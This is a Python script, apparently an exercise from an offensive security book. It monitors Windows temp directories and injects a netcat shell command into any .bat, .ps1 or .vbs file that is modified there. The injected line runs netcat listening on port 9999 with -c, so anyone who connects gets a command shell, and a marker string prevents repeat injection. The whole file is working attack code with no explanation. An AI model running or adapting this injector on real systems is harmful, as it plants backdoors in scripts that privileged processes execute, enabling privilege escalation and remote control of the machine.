import os
import tempfile
import threading
import win32con
import win32file

FILE_CREATED = 1 
FILE_DELETED = 2
FILE_MODIFIED = 3
FILE_RENAMED_FROM = 4
FILE_RENAMED_TO = 5

BIN = 'c:\\users\\eric\\desktop\\netcat.ext'
TGT_IP = '192.168.127.132'
CMD = f'{BIN} -t {TGT_IP} -p 9999 -l -c'

# file extensions to monitor and code to inject for each type, use marker to prevent multiple injections
FILE_TYPES = {
    '.bat': ["\r\nREM bhpmarker\r\n", f'\r\n{CMD}\r\n'],
    '.ps1': ["\r\n# bhpmarker\r\n", f'\r\nStart-Process "{CMD}"\r\n'],
    '.vbs': ["\r\n'bhpmarker\r\n", f'\r\nCreateObject("Wscript.Shell").Run "{CMD}")\r\n'],
}

FILE_LIST_DIRECTORY = 0x0001
# directories to monitor for file changes
PATHS = ['c:\\windows\\temp', tempfile.gettempdir()]

def inject_code(full_filename, contents, extension):
    # check for marker in file to prevent multiple injections
    if FILE_TYPES[extension][0].strip() in contents:
        return
    # add marker and inject code
    full_contents = FILE_TYPES[extension][0]
    full_contents += FILE_TYPES[extension][1]
    full_contents += contents
    with open(full_filename, 'w') as f:
        f.write(full_contents)
    print('\\o/ Injected code.')

def monitor(path_to_watch):
    # obtain handle to directory to monitor
    h_directory = win32file.CreateFile(
        path_to_watch,
        FILE_LIST_DIRECTORY,
        win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
        None,
        win32con.OPEN_EXISTING,
        win32con.FILE_FLAG_BACKUP_SEMANTICS,
        None
        )
    while True:
        try:
            # notify on directory modification
            results = win32file.ReadDirectoryChangesW(
                h_directory,
                1024,
                True,
                win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
                win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
                win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
                win32con.FILE_NOTIFY_CHANGE_SIZE |
                win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
                win32con.FILE_NOTIFY_CHANGE_SECURITY,
                None,
                None
            )
            # return file name and type of action performed on file
            for action, file_name in results:
                full_filename = os.path.join(path_to_watch, file_name)
                if action == FILE_CREATED:
                    print(f'[+] Created: {full_filename}')
                elif action == FILE_DELETED:
                    print(f'[-] Deleted: {full_filename}')
                elif action == FILE_MODIFIED:
                    print(f'[*] Modified: {full_filename}')
                    extension = os.path.splitext(full_filename)[1]
                    try:
                        print('[vvv] Dumping contents:')
                        with open(full_filename) as f:
                            contents = f.read()
                        # inject code into modified file
                        if extension in FILE_TYPES:
                            inject_code(full_filename, contents, extension)
                        print(contents)
                        print('[^^^] End of file contents')
                    except Exception as e:                        
                        print(f'[!!!] Could not read file for injection: {e}')

                    # try:
                        
                    #     # dump contents of modified file to console
                    #     with open(full_filename, 'r') as f:
                    #         contents = f.read()
                    #         print(contents)
                    #         print('[^^^] End of file contents')
                    # except Exception as e:
                    #     print(f'[!!!] Could not read file: {e}')

                elif action == FILE_RENAMED_FROM:
                    print(f'[>] Renamed from: {full_filename}')
                elif action == FILE_RENAMED_TO:
                    print(f'[<] Renamed to: {full_filename}')
                else:
                    print(f'[?] Unknown action {action} on file: {full_filename}')
        except KeyboardInterrupt:
            raise
        except Exception as e:
            print(f'[!!!] Error monitoring directory: {e}')
            pass

if __name__ == '__main__':
    try:
        print(f'Monitoring directories: {", ".join(PATHS)}. Press Ctrl+C to exit.')
        for path in PATHS:
            monitor_thread = threading.Thread(target=monitor, args=(path,))
            monitor_thread.daemon = True
            monitor_thread.start()
        while True:
            threading.Event().wait(0.1)
    except KeyboardInterrupt:
        print('Exiting...')
   